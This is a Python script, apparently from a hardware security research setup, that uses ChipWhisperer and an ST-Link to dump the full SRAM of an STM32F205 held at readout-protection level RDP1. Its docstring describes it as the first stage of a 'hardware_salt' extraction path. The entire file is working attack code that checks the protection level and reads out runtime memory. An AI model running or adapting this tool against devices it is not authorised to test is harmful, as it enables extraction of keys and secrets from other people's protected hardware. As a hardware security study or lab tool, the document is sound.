#!/usr/bin/env python
"""rdp1_sram_dump.py  -  FULL SRAM dump via SWD (RDP1 no-glitch path).

At RDP1 the SWD debug port can still read SRAM (0x20000000, 128 KB on F205)
while flash and the 0x1FFF UID/OTP region are blocked. This is the no-glitch
front half of the hardware_salt path: boot the real firmware (BOOT0 low),
let it populate .data/.bss, then read the whole SRAM out over SWD.

READ-ONLY: powers the chip, connects SWD, reads memory. No writes, no option
bytes, no erase, no glitch. Safe at RDP1 (and RDP0). On RDP2 SWD is fused off
and this will fail to connect - that failure is expected, not a fault.

Outputs: storage-sim/dumps/sram/sram_<UTC>.bin  + a hexdump summary.

Env:
  G_BOOT0_HIGH=1      power into the system bootloader instead of firmware
                      (default 0 = BOOT0 low = normal firmware boot)
  G_SRAM_BYTES=N      bytes to read (default 131072 = full 128 KB)
  G_LEAVE_POWERED=0   cut target power on exit (default: leave powered)
  G_SWD_HZ=N          SWD clock (default 1800000)
"""
import os
import sys
import time
import gc
from datetime import datetime, timezone

import chipwhisperer as cw

SRAM_BASE = 0x20000000
OPTCR     = 0x40023C14          # F2 FLASH_OPTCR; bits 15:8 = RDP byte
FLASH_BASE = 0x08000000
SRAM_BYTES = int(os.environ.get('G_SRAM_BYTES', 131072))
SWD_HZ     = int(os.environ.get('G_SWD_HZ', 1800000))
DUMP_DIR   = os.environ.get('G_OUT_DIR') or os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'dumps', 'sram')

scope = None


def power_on():
    s = cw.scope()
    s.clock.clkgen_freq = 16e6          # discipline: clkgen first
    s.io.glitch_hp = False              # crowbar OFF
    s.io.glitch_lp = False
    s.io.tio1 = os.environ.get('G_BOOT0_HIGH', '0') == '1'  # BOOT0
    s.io.tio2 = 'high_z'
    s.io.tio4 = 'high_z'                # NRST released
    s.io.target_pwr = False
    time.sleep(0.5)
    s.io.target_pwr = True
    time.sleep(1.0)                     # rails settle, firmware boots
    return s


def rdp_level(st):
    try:
        optcr = st.get_mem32(OPTCR)
        rdp = (optcr >> 8) & 0xFF
        lvl = {0xAA: 'RDP0', 0xCC: 'RDP2'}.get(rdp, 'RDP1')
        return optcr, rdp, lvl
    except Exception as e:
        return None, None, f'(OPTCR read failed: {type(e).__name__})'


def flash_blocked(st):
    """At RDP1, reading flash over SWD faults. Return True if it's blocked."""
    try:
        st.get_mem32(FLASH_BASE)
        return False            # read succeeded -> NOT blocked (RDP0)
    except Exception:
        return True             # faulted -> blocked (RDP1/2), as expected


def main():
    global scope
    boot = 'BOOT0 HIGH (bootloader)' if os.environ.get('G_BOOT0_HIGH') == '1' \
           else 'BOOT0 low (firmware)'
    print(f'[+] powering: {boot}, crowbar OFF, no glitch.')
    scope = power_on()

    try:
        from swd.stlink import Stlink
    except Exception as e:
        print(f'[!] cannot import swd.stlink: {e}')
        return finish(2)

    st = None
    for attempt in range(3):
        try:
            st = Stlink(swd_frequency=SWD_HZ)
            break
        except Exception as e:
            print(f'[!] SWD connect attempt {attempt+1} failed: '
                  f'{type(e).__name__}: {e}')
            time.sleep(0.6)
    if st is None:
        print('[!] SWD would not come up. If ST-Link is stuck (USB Errno 5),')
        print('    reset it: USBDEVFS_RESET on its /dev/bus/usb node, then retry.')
        print('    On RDP2 this failure is EXPECTED (SWD fused off).')
        return finish(1)

    idc = st.get_idcode()
    try:
        vt = st.get_target_voltage()
    except Exception:
        vt = float('nan')
    print(f'[+] SWD up. IDCODE=0x{idc:08x}  Vtarget={vt:.2f}V')

    optcr, rdp, lvl = rdp_level(st)
    if optcr is not None:
        print(f'[+] OPTCR=0x{optcr:08x}  RDP=0x{rdp:02x} -> {lvl}')
    else:
        print(f'[!] {lvl}')
    blocked = flash_blocked(st)
    print(f'[+] flash @ 0x{FLASH_BASE:08x} over SWD: '
          + ('BLOCKED (consistent with RDP1/2)' if blocked
             else 'READABLE (chip is at RDP0!)'))

    # ---- the dump ----
    chunk = st.maximum_32bit_data           # 6144 on this ST-Link
    chunk -= chunk % 4
    data = bytearray()
    t0 = time.time()
    addr = SRAM_BASE
    remaining = SRAM_BYTES
    try:
        while remaining > 0:
            n = min(chunk, remaining)
            n -= n % 4
            if n == 0:
                break
            block = st.read_mem32(addr, n)
            data += bytes(block)
            addr += n
            remaining -= n
    except Exception as e:
        print(f'[!] SRAM read FAILED at 0x{addr:08x} '
              f'(+{len(data)} bytes in): {type(e).__name__}: {e}')
        if not data:
            return finish(1)
        print('    partial dump kept.')
    dt = time.time() - t0
    print(f'[+] SRAM read: {len(data)} bytes @ 0x{SRAM_BASE:08x} '
          f'in {dt:.1f}s ({len(data)/max(dt,1e-3)/1024:.0f} KiB/s)')

    # ---- save + summary ----
    os.makedirs(DUMP_DIR, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
    out = os.path.join(DUMP_DIR, f'sram_{ts}.bin')
    with open(out, 'wb') as f:
        f.write(data)
    nz = sum(1 for b in data if b)
    print(f'[+] saved {out}')
    print(f'    non-zero bytes: {nz}/{len(data)} ({100*nz/max(len(data),1):.1f}%)')
    _hexdump('first 64 bytes', data[:64], SRAM_BASE)
    _hexdump('last 64 bytes',  data[-64:], SRAM_BASE + len(data) - 64)

    verdict = ('SRAM dumped over SWD at RDP1 (flash blocked, SRAM readable)'
               if blocked else 'SRAM dumped - but chip is at RDP0 (flash open)')
    print(f'\n[VERDICT] {verdict}')
    return finish(0)


def _hexdump(title, chunk, base):
    print(f'  {title}:')
    for off in range(0, len(chunk), 16):
        row = chunk[off:off+16]
        hexs = ' '.join(f'{b:02x}' for b in row)
        asc = ''.join(chr(b) if 32 <= b < 127 else '.' for b in row)
        print(f'    {base+off:08x}  {hexs:<47}  {asc}')


def finish(rc):
    try:
        scope.io.glitch_hp = False
        scope.io.glitch_lp = False
        if os.environ.get('G_LEAVE_POWERED', '1') == '0':
            scope.io.target_pwr = False
            print('[+] target power cut.')
        else:
            print('[+] target left powered (G_LEAVE_POWERED=0 to cut).')
        scope.dis()
    except Exception:
        pass
    gc.collect()
    return rc


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        finish(1)
        sys.exit(1)
